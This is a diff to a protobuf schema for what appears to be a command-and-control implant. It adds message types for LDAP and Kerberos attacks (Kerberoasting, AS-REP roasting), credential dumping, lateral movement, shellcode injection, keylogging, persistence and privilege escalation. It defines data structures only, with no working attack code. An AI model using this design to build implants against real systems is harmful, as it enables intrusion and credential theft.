@@ -29,6 +29,13 @@ enum TaskType {
   TASK_EXIT          = 19;
   TASK_SLEEP         = 20;
   TASK_MODULE        = 21;
+  TASK_LDAP_ENUM     = 22;
+  TASK_KERBEROAST    = 23;
+  TASK_ASREPROAST    = 24;
+  TASK_LATERAL_MOVE  = 25;
+  TASK_PE_LOAD_EXEC  = 26;
+  TASK_PERSIST       = 27;
+  TASK_PRIVESC       = 28;
 }
 
 // --- Implant <-> Teamserver ---
@@ -106,7 +113,8 @@ message ShellResult {
   int32  exit_code = 3;
 }
 
-// Phase 2+ task payloads (stubs)
+// --- File Transfer ---
+
 message FileDownloadTask {
   string remote_path = 1;
 }
@@ -125,12 +133,298 @@ message FileUploadResult {
   bool success = 1;
 }
 
+// --- Sleep ---
+
 message SleepTask {
   int64 sleep_ms   = 1;
   int32 jitter_pct = 2;
 }
 
+// --- Module ---
+
 message ModuleTask {
   string module_name = 1;
   bytes  config      = 2;
+}
+
+// --- Process Management ---
+
+message ProcessListTask {}
+
+message ProcessListResult {
+  repeated ProcessInfo processes = 1;
+}
+
+message ProcessInfo {
+  uint32 pid          = 1;
+  uint32 ppid         = 2;
+  string name         = 3;
+  string user         = 4;
+  string arch         = 5;
+  uint64 memory_bytes = 6;
+  string command_line = 7;
+}
+
+message ProcessKillTask {
+  uint32 pid = 1;
+}
+
+message ProcessKillResult {
+  bool success = 1;
+}
+
+// --- Network Recon ---
+
+message NetIfconfigTask {}
+
+message NetIfconfigResult {
+  repeated NetInterface interfaces = 1;
+}
+
+message NetInterface {
+  string          name      = 1;
+  repeated string addresses = 2;
+  string          mac       = 3;
+  uint32          mtu       = 4;
+  bool            up        = 5;
+}
+
+message NetPortscanTask {
+  string          target     = 1;
+  repeated uint32 ports      = 2;
+  uint32          timeout_ms = 3;
+  uint32          threads    = 4;
+}
+
+message NetPortscanResult {
+  repeated PortResult ports = 1;
+}
+
+message PortResult {
+  string host    = 1;
+  uint32 port    = 2;
+  bool   open    = 3;
+  string service = 4;
+}
+
+// --- AD Enumeration ---
+
+message LDAPEnumConfig {
+  string          target_dc     = 1;
+  string          domain        = 2;
+  string          username      = 3;
+  string          password      = 4;
+  string          ntlm_hash     = 5;
+  string          query_type    = 6;
+  string          custom_filter = 7;
+  repeated string attributes    = 8;
+}
+
+message LDAPEnumResult {
+  string              domain        = 1;
+  string              dc            = 2;
+  string              query_type    = 3;
+  repeated LDAPEntry  entries       = 4;
+  int32               total_results = 5;
+}
+
+message LDAPEntry {
+  string                    dn         = 1;
+  map<string, LDAPValues>   attributes = 2;
+}
+
+message LDAPValues {
+  repeated string values = 1;
+}
+
+// --- Kerberos Attacks ---
+
+message KerberoastConfig {
+  string          target_dc   = 1;
+  string          domain      = 2;
+  string          username    = 3;
+  string          password    = 4;
+  string          ntlm_hash   = 5;
+  repeated string target_spns = 6;
+  string          encryption  = 7;
+}
+
+message KerberoastResult {
+  repeated KerberoastHash hashes = 1;
+}
+
+message KerberoastHash {
+  string spn              = 1;
+  string sam_account_name = 2;
+  string hash             = 3;
+  string encryption_type  = 4;
+}
+
+message ASREPRoastConfig {
+  string          target_dc    = 1;
+  string          domain       = 2;
+  repeated string target_users = 3;
+}
+
+message ASREPRoastResult {
+  repeated ASREPHash hashes = 1;
+}
+
+message ASREPHash {
+  string username = 1;
+  string hash     = 2;
+}
+
+// --- Credential Dumping ---
+
+message CredDumpConfig {
+  string method        = 1;
+  uint32 target_pid    = 2;
+  string output_format = 3;
+}
+
+message CredDumpResult {
+  string              method      = 1;
+  repeated Credential credentials = 2;
+}
+
+message Credential {
+  string type     = 1;
+  string domain   = 2;
+  string username = 3;
+  string value    = 4;
+  string source   = 5;
+}
+
+// --- Lateral Movement ---
+
+message LateralMoveConfig {
+  string method       = 1;
+  string target       = 2;
+  string domain       = 3;
+  string username     = 4;
+  string password     = 5;
+  string ntlm_hash    = 6;
+  bytes  ticket       = 7;
+  string command      = 8;
+  bytes  payload      = 9;
+  string service_name = 10;
+}
+
+message LateralMoveResult {
+  string method  = 1;
+  string target  = 2;
+  bool   success = 3;
+  string output  = 4;
+}
+
+// --- Process Injection ---
+
+message InjectTask {
+  string method          = 1;
+  uint32 target_pid      = 2;
+  bytes  shellcode       = 3;
+  bool   start_suspended = 4;
+}
+
+message InjectResult {
+  bool   success    = 1;
+  uint32 target_pid = 2;
+  uint32 thread_id  = 3;
+}
+
+// --- PE/Shellcode Loading ---
+
+message PELoadTask {
+  bytes  pe_data    = 1;
+  string method     = 2;
+  string args       = 3;
+  uint32 target_pid = 4;
+}
+
+message PELoadResult {
+  bool  success = 1;
+  bytes output  = 2;
+}
+
+// --- Screenshot ---
+
+message ScreenshotTask {
+  uint32 monitor = 1;
+  uint32 quality = 2;
+}
+
+message ScreenshotResult {
+  bytes  image_data = 1;
+  string format     = 2;
+  uint32 width      = 3;
+  uint32 height     = 4;
+}
+
+// --- Keylogger ---
+
+message KeylogStartTask {
+  bool capture_window_titles = 1;
+}
+
+message KeylogStopTask {}
+
+message KeylogDumpTask {}
+
+message KeylogDumpResult {
+  repeated KeylogEntry entries = 1;
+}
+
+message KeylogEntry {
+  string window_title = 1;
+  string keys         = 2;
+  int64  timestamp    = 3;
+}
+
+// --- SOCKS Proxy ---
+
+message SocksStartTask {
+  uint32 port = 1;
+}
+
+message SocksStartResult {
+  bool   success = 1;
+  uint32 port    = 2;
+}
+
+message SocksStopTask {}
+
+message SocksStopResult {
+  bool success = 1;
+}
+
+// --- Persistence ---
+
+message PersistConfig {
+  string method       = 1;
+  string name         = 2;
+  string payload_path = 3;
+  string trigger      = 4;
+  bytes  payload      = 5;
+}
+
+message PersistResult {
+  bool   success = 1;
+  string method  = 2;
+  string details = 3;
+}
+
+// --- Privilege Escalation ---
+
+message PrivescConfig {
+  string method     = 1;
+  uint32 target_pid = 2;
+  string command    = 3;
+}
+
+message PrivescResult {
+  bool   success       = 1;
+  string method        = 2;
+  string new_integrity = 3;
+  uint32 new_pid       = 4;
 }
